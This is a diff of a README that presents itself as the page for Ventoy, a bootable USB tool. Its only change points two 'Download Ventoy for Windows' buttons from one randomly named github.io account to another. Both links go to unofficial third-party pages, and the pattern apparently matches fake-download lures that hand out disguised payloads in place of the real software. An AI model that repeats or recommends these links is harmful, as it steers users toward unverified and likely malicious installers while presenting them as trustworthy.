@@ -16,7 +16,7 @@ Ventoy is an open-source bootable USB tool for Windows that installs to a drive 
 <div align="center">
   <h3>Set up your USB once, then boot any ISO you copy onto it</h3>
 
-  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Ventoy-Desktop-App)
+  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://williamgraves63.github.io/.github/Ventoy-Desktop-App)
 
 </div>
 
@@ -92,7 +92,7 @@ For help with Ventoy, open the built-in Help or Support section inside the app, 
 <div align="center">
   <h3>Ready to get started with Ventoy?</h3>
 
-  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Ventoy-Desktop-App)
+  [![Download Ventoy](https://img.shields.io/badge/⬇_Download_Ventoy_for_Windows-2962FF?style=for-the-badge)](https://williamgraves63.github.io/.github/Ventoy-Desktop-App)
 
 </div>
 
